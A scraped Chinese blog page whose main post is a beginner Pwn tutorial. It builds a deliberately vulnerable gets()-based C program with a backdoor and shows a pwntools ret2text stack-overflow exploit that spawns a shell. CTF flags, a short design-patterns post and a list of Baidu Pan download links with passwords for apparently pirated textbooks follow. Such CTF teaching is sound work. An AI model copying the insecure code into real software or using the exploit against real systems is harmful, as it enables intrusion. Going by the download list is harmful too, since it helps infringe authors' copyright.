+<p>moectf{I_L0Ve_M@th_AnD_CRypT0}</p>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-08T10:31:16.000Z" title="2021/7/8 18:31:16">2021-07-08</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:14:53.486Z" title="2022/10/12 12:14:53">2022-10-12</time>更新</span><span class="level-item"> XDU </span><span class="level-item">25 分钟读完 (大约3778个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/08/Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/">Pwn从入门到入狱</a></h1><div class="content"><h1><span id="pwn从入门到入狱">Pwn从入门到入狱</span></h1><p>Copyright © 2020 arttnba3,XDSEC</p>
+<h2><span id="简介什么是pwn">简介：什么是Pwn？</span></h2><p><strong>Pwn</strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即<strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p>
+<p>Pwn也是最能代表<strong>原教旨主义黑客</strong>的一个安全研究方向<del>同时也是最容易进监狱的一个方向</del></p>
+<h2><span id="预备知识">预备知识</span></h2><p>作为二进制安全的分支之一，Pwn需要你<strong>熟练掌握</strong>如下基础知识：</p>
+<ul>
+<li><strong>主流平台汇编语言，包括但不局限于X86、MIPS等</strong></li>
+<li><strong>C语言</strong></li>
+<li><strong>计算机组成原理</strong></li>
+<li><strong>计算机操作系统</strong></li>
+<li><strong>静态分析（IDA）&amp;动态调试（GDB）</strong></li>
+<li><strong>Python</strong></li>
+<li><strong>编译原理</strong></li>
+<li><strong>……</strong></li>
+</ul>
+<p>看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是<strong>一边比赛一边学习的</strong>，所以不用担心因为自己0基础导致无法入门的情况的发生</p>
+<blockquote>
+<p>CTF TO LEARN, NOT LEARN TO CTF</p>
+</blockquote>
+<h2><span id="pwn的解题过程">Pwn的解题过程？</span></h2><ol>
+<li>题目的二进制文件一般会被部署到服务器上，使用<code>nc xx.xx.xx.xx(ip) xxxx(端口)</code>命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。</li>
+<li>你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写<code>Exploit</code>(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的<code>flag文件或字符串</code>，将其提交至本平台。</li>
+<li>注意命令行中的<code>nc</code>并不是做题工具，你需要在Linux下安装<code>pwntools</code>库（或者其它），用于编写可用性较高的<code>Exploit</code>。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~</li>
+</ol>
+<h2><span id="0基础入门新人的第一个安全漏洞的利用栈溢出ret2text">0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</span></h2><blockquote>
+<h4><span id="前置知识要求">前置知识要求</span></h4><ul>
+<li>C语言基本语法</li>
+<li>Python语言基本语法</li>
+</ul>
+<p>能大致看得懂C程序、有写简单的Python程序的能力即可</p>
+<h4><span id="前置环境要求">前置环境要求</span></h4><ul>
+<li><p>Windows</p>
+</li>
+<li><p>Linux</p>
+</li>
+</ul>
+<p>我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成</p>
+<p>你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux</p>
+<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢</p>
+<h4><span id="百度linux-换源与pip-换源更换linux下的软件源为国内的软件源提高下载速度">百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</span></h4><h4><span id="不同的linux发行版本如ubuntu-kali-manjaro等请自行将搜索框内的linux换为对应的发行版名称">不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</span></h4></blockquote>
+<p>以下内容将通过几个样例简单地帮助你入门Pwn</p>
+<h3><span id="以下内容操作环境位于linux">以下内容操作环境位于Linux</span></h3><p>我们现在来看这样的一个程序：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tell me your name plz:&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们使用<code>-fno-stack-protector</code>、<code>-z norelro</code>、<code>-z execstack</code>、<code>-no-pie</code>这四条编译指令把这个程序的保护都给关掉</p>
+<p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p>
+<h4><span id="安全检查checksec">安全检查：checksec</span></h4><p><strong>使用<code>checksec</code>指令可以查看程序的保护开启情况</strong></p>
+<p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p>
+<p>可以在控制台输入如下指令安装：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install checksec</span><br></pre></td></tr></table></figure>
+
+<h4><span id="逻辑分析">逻辑分析</span></h4><p>这个程序做了些什么？</p>
+<ul>
+<li><p>定义了一个后门函数<code>backdoor()</code>，但是并未调用</p>
+</li>
+<li><p>分配了20个字节大小的内存空间给到char类型数组str</p>
+</li>
+<li><p>使用<code>gets()</code>函数从标准输入流读入字符串并写入数组str内</p>
+</li>
+</ul>
+<p>我们可以看到当我们在编译时编译器<strong>给了一个警告</strong>，这是因为<strong>gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限</strong></p>
+<p>我们尝试着输入超过20个字节的字符串，看看会发生些什么：</p>
+<p><img src="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png" alt="image.png"></p>
+<p>程序崩溃，提示<strong>Segmentation fault</strong>（<strong>段错误</strong>），即<strong>该程序尝试访问了不属于他的内存空间</strong></p>
+<p>但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，<strong>为什么输入不一样就会导致程序崩溃呢？</strong></p>
+<h3><span id="以下内容操作环境位于windows">以下内容操作环境位于Windows</span></h3><h4><span id="ida逆向分析">IDA：逆向分析</span></h4><p>通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——<strong>IDA</strong></p>
+<p>我们尝试使用<strong>IDA</strong>对程序进行<strong>逆向分析</strong></p>
+<blockquote>
+<p>注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA</p>
+</blockquote>
+<p>当我们将程序拖入IDA后，除了我们自己写的<code>backdoor()</code>函数、<code>func()</code>函数及<code>main()</code>函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数，</p>
+<p><img src="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png" alt="image.png"></p>
+<p>这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码</p>
+<p><img src="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png" alt="image.png"></p>
+<p>同样地，双击func函数我们也可以看到其原始的汇编代码</p>
+<p><img src="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png" alt="image.png"></p>
+<blockquote>
+<h3><span id="f5键使用ida进行逆向分析的神器">F5键：使用IDA进行逆向分析的神器</span></h3><p>当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程</p>
+<p><img src="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png" alt="image.png"></p>
+<p>要注意的是<strong>不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要</strong></p>
+<p>如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现</p>
+<p><img src="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png" alt="image.png"></p>
+<p>如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2）</p>
+<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
+</blockquote>
+<p>push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用</p>
+<h3><span id="以下内容操作环境位于linux">以下内容操作环境位于Linux</span></h3><h4><span id="栈帧">栈帧</span></h4><p>为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——<strong>栈帧</strong>（<strong>Stack Frame</strong>）</p>
+<blockquote>
+<p>推荐阅读——《程序员的自我修养》第10章</p>
+</blockquote>
+<blockquote>
+<p>在讲栈帧之前，我们先简单地讲一讲什么是<strong>栈</strong></p>
+<p>在数据结构中，<strong>栈</strong>（<strong>stack</strong>）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out）</p>
+<p>在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。</p>
+</blockquote>
+<p>当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的<strong>栈帧</strong>，用以储存属于这个函数的数据与基本信息，包括如下信息：</p>
+<ul>
+<li><strong>函数的返回地址和参数</strong></li>
+<li><strong>临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量</strong></li>
+</ul>
+<p>想象如下一个空的栈：</p>
+<p><strong>需要注意的是：在内存当中，栈是由高地址向低地址方向增长的</strong></p>
+<p><img src="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png" alt="64E3FCC73EF02703BA8C857A91F96838.png"></p>
+<p>这里引入一个新的概念——<strong>栈指针寄存器SP</strong>（<strong>Stack Pointer</strong>）与<strong>帧指针寄存器BP</strong>（<strong>Frame Pointer</strong>），这两个寄存器用以管理栈帧，其中<strong>SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问</strong></p>
+<p>当我们要调用一个函数时，首先会先<strong>将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成</strong>，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址</p>
+<p>我们还是以刚刚反汇编出来的代码进行分析：</p>
+<p>右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑</p>
+<p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          = byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; // starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png" alt="52DF40089C8FCCF9D5CF8DE7211B73D8.png"></p>
+<p>接下来就来到了我们看到的前两行汇编代码：<code>push rbp</code>与<code>mov rbp, rsp</code>，我们不难从指令的英文释义上知道其流程：</p>
+<ul>
+<li><strong>将bp寄存器的值压入栈中</strong></li>
+<li><strong>将sp寄存器的值赋给bp寄存器</strong></li>
+</ul>
+<p><img src="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png" alt="9CF0F7F5A8DA1972F88EF480E4FB6271.png"></p>
+<p>接下来的<code>sub rsp, 20h</code>指令的作用是<strong>开辟栈空间</strong>，处在sp与bp之间的这一块区域便用于储存数据</p>
+<p><img src="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png" alt="A422C008B65723152D16FDDAD8421B38.png"></p>
+<p>我们的<code>char str[20];</code>所占用的空间也在这里，同时我们可以发现我们<strong>虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据</strong>（以后会学到）</p>
+<p><img src="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png" alt="227643CB6A805274DA147132CC0413DE.png"></p>
+<p>那么接下来就进入到我们对<code>gets()</code>函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以<strong>将返回地址前面的数据全部填充</strong>（<strong>padding</strong>）<strong>掉，并将返回地址覆写为别的地址，改变程序的执行流程</strong></p>
+<p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p>
+<p>我们最终的目的是<strong>获取到shell</strong>，那么只要程序当中存在着<code>system(&quot;/bin/sh&quot;)</code>的函数调用，我们再将程序返回到其地址上，即可get shell</p>
+<p>构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)  <span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure>
+
+<p>我们之前在程序当中写了一个<code>backdoor()</code>函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为<code>0x400547</code></p>
+<p><img src="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png" alt="image.png"></p>
+<h4><span id="攻击神器pwntools">攻击神器：pwntools</span></h4><p>接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——<strong>pwntools</strong></p>
+<blockquote>
+<p>pwntools需要在<strong>Linux</strong>系统下使用（如Ubuntu、manjaro、kali等）</p>
+<p>在shell中输入如下指令安装pwntools</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo pip install pwntools</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>使用pwntools库我们可以很方便地输入相应的payload</p>
+<p>接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    <span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)   <span class="comment"># 运行一个程序</span></span><br><span class="line">        <span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">           <span class="comment"># p = remote(addr,port)</span></span><br><span class="line">              <span class="comment"># 如：p = remote(&#x27;sec.arttnba3.cn&#x27;,10001)</span></span><br><span class="line">p.recv()      <span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)  <span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line">        <span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + sys_addr <span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)    <span class="comment"># 向程序发送我们的输入</span></span><br><span class="line">        <span class="comment"># 需要注意的是，sendline()会在末尾添加换行符&#x27;\n&#x27;</span></span><br><span class="line">           <span class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()     <span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>成功get shell</strong></p>
+<p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p>
+<p>至此，我们已经完成了<strong>从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程</strong>，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了</p>
+<p><strong>为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-08T02:32:57.000Z" title="2021/7/8 10:32:57">2021-07-08</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:00:46.820Z" title="2022/10/12 12:00:46">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">3 分钟读完 (大约483个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/08/%E5%85%B3%E4%BA%8E%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">关于设计模式</a></h1><div class="content"><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/the-relationship-between-design-patterns.jpg" alt="题图"></p>
+<h3><span id="概念">概念</span></h3><p>先搬一下介绍（</p>
+<blockquote>
+<p>设计模式（Design pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。</p>
+</blockquote>
+<blockquote>
+<p>设计模式是一套被反复使用的、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了重用代码、让代码更容易被他人理解、保证代码可靠性。 毫无疑问，设计模式于己于他人于系统都是多赢的，设计模式使代码编制真正工程化，设计模式是软件工程的基石，如同大厦的一块块砖石一样。项目中合理地运用设计模式可以完美地解决很多问题，每种模式在现实中都有相应的原理来与之对应，每种模式都描述了一个在我们周围不断重复发生的问题，以及该问题的核心解决方案，这也是设计模式能被广泛应用的原因。</p>
+</blockquote>
+<p>在着手写代码之前，应该先规划好要如何去写，即所谓的成竹在胸。这个过程中，首先需要根据实际需要选择设计模式。</p>
+<p>比如，如果我需要写一个计算器，那么我就需要先考虑清楚处理流程。然后，根据流程的复杂度和其他因素，决定是否使用面向对象方法。</p>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-08T00:33:53.000Z" title="2021/7/8 08:33:53">2021-07-08</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:01:27.687Z" title="2022/10/12 12:01:27">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">35 分钟读完 (大约5209个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B9%A6%E7%B1%8D%E6%94%B6%E9%9B%86/">计算机书籍收集</a></h1><div class="content"><blockquote>
+<p>直接放上原作者的链接吧（</p>
+</blockquote>
+<p>计算机类的书籍那么贵，作为一个几个小时看完一本书且机不离身的程序员，天天买纸质书是不可能的了，所以对电子书的需求量还是挺多的。为了方便广大的小伙伴也能方便找到对应的电子书，我花费洪荒之力从各个搜索网站收集了几百本常用的电子书。</p>
+<blockquote>
+<p><strong>重要说明</strong>：<strong>如果目录无法跳转的话，直接拉下去就可以了</strong>，这些书籍都是在同一个页面的，我只是方便大家找到对应的，弄了一个<strong>页内目录</strong>，不过有部分读者反馈他跳转不了（手机是绝对跳转不了的了）。</p>
+</blockquote>
+<ul>
+<li><a href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3%E4%B9%A6%E7%B1%8D">数据结构与算法相关书籍</a></li>
+<li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80">计算机基础</a><ul>
+<li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a></li>
+<li><a href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80">汇编语言</a></li>
+<li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">计算机网络</a></li>
+</ul>
+</li>
+<li><a href="#python">Python</a><ul>
+<li><a href="#1python%E5%9F%BA%E7%A1%80">1、Python基础</a></li>
+<li><a href="#2%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E7%88%AC%E8%99%AB">2、数据分析与爬虫</a></li>
+</ul>
+</li>
+<li><a href="#linux">Linux</a></li>
+<li><a href="#c%E8%AF%AD%E8%A8%80">C语言</a></li>
+<li><a href="#c">C</a></li>
+<li><a href="#%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD">人工智能</a></li>
+<li><a href="#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">设计模式</a></li>
+<li><a href="#java">Java</a><ul>
+<li><a href="#java-%E5%9F%BA%E7%A1%80">Java 基础</a></li>
+<li><a href="#java%E8%BF%9B%E9%98%B6">Java进阶</a></li>
+<li><a href="#javaweb">JavaWeb</a></li>
+</ul>
+</li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a></li>
+<li><a href="#go">Go</a></li>
+<li><a href="#%E9%9D%A2%E8%AF%95%E7%9B%B8%E5%85%B3">面试相关</a></li>
+</ul>
+<h1><span id="数据结构与算法相关书籍">数据结构与算法相关书籍</span></h1><ul>
+<li>1.1《啊哈！算法 啊哈磊扫描版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wIfHrFXhbzF_TMaR_hNe-A">百度云下载链接</a> 密码: 5h9s</li>
+<li>1.2《算法图解》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1uqpuVxh4al9YMIRhcVYaug">百度云下载链接</a> 密码: shda</li>
+<li>1.3《妙趣横生的算法（C语言实现 第2版）》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1rxuKW1hPsfrQfWToSiYhOA">百度云下载链接</a> 密码: 6m7s</li>
+<li>1.4《趣学算法》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ZY8OwWQOLM31GdWufJhjnw">百度云下载链接</a> 密码: tu4r</li>
+<li>1.5《大话数据结构》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1b8ebNBHmMPhRtWGq-lUrpA">百度云下载链接</a> 密码: tlrq</li>
+<li>1.6《算法神探完整版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1vjD0uhIkyxpVirvIFIKVfQ">百度云下载链接</a> 密码: ia5d</li>
+<li>1.7《算法帝国》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1JRlBFaoHt8Ij1OEltFqQSQ">百度云下载链接</a> 密码: uwp8</li>
+<li>1.8《算法设计与分析基础第3版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1sEg_34upNP9hvfNsAksINg">百度云下载链接</a> 密码: kpff</li>
+<li>2.1《算法导论_英文版_第三版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14mf0dwJG8JWZ8jSznkEWgg">百度云下载链接</a> 密码: ecms</li>
+<li>2.1《算法导论中文版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1snNp5a1rjM6QCryQ-XNWQg">百度云下载链接</a> 密码: fpqn</li>
+<li>2.2《算法 (第4版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1TD8Nb_P7mlyyduzWGdrXZw">百度云下载链接</a> 密码: k7ah</li>
+<li>2.3《数据结构与算法 Java版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1BaY8bL3prf-QOcvrWzH4oA">百度云下载链接</a> 密码: jw81</li>
+<li>2.4《Algorithms算法概论中文版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1EaBLy3p-UvZOGQXrzskB-A">百度云下载链接</a> 密码: goi3</li>
+<li>2.5《算法心得-高效算法的奥秘(原书第2版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14F5cjh1yGaslAM3RLGqWhg">百度云下载链接</a> 密码: nsip</li>
+<li>2.6《计算机程序设计艺术 第1卷：基本算法（第三版）高清中文版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1xrcyTNy3ZhRv_s-bwdshcA">百度云下载链接</a> 密码: 931f</li>
+<li>2.7《计算机程序设计艺术 第2卷：半数值算法（第三版）高清中文版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1QR_yk70GAcL-tcqs4KCgZQ">百度云下载链接</a> 密码: m4mh</li>
+<li>2.8《计算机程序设计艺术 第3卷：排序与查找（第二版）高清中文版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/16G3jYuIn6BZcOMb7iTxNNQ">百度云下载链接</a> 密码: o1r4</li>
+<li>2.9《计算机算法设计与分析 第4版 (王晓东) 课后答案[1-9章]》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wTnM_P4hxUwNQiIk9u4YsQ">百度云下载链接</a> 密码: 9rjh</li>
+<li>2.9《计算机算法设计与分析(第三版)课后习题答案详解》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1O-WWwzo30-SMwyNDAU1EuA">百度云下载链接</a> 密码: 124d</li>
+<li>2.9《计算机算法设计与分析(王晓东)(第二版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iFsj3uRj1Rzsl7y2lUtyZA">百度云下载链接</a> 密码: wqep</li>
